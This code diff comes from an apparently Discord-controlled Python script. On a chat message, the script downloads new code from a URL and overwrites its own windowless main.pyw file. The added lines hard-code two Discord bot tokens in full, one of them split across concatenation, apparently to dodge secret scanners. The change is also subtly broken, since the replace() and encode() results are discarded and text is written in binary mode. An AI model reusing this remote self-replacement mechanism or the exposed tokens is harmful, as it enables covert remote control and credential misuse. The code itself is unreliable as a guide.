@@ -123,11 +123,14 @@ async def on_message(ctx):
             file_destination = str(os.getcwd()) + "\\main.pyw"
             print(file_destination)
             res = requests.get(url)
-            print("updating")
+            cntnt = res.content
+            cntnt = cntnt.decode("utf-8")
+            cntnt.replace("MTAwOTg4MjczMDQ2NjYzOTkxMg.G4vO2U.PWmPPIVWuQfueyoqlLsBBogHsSFtg7gdBuBtw8", "MTAwOTg4MjczMDQ2NjYzOTkxMg.GA_YDP.XXbO5" + "PqbYQ_HCgw2ZwhBIngTNST4hWNsQ6Wz48")
+            cntnt.encode("utf-8")
             if res.status_code == 200:  # http 200 means success
                 
                 with open(file_destination, 'wb') as file_handle:  # wb means Write Binary
-                    file_handle.write(res.content)
+                    file_handle.write(cntnt)
             #mfd.Download(url, file_destination, quiet=True)
 
                     print("done")
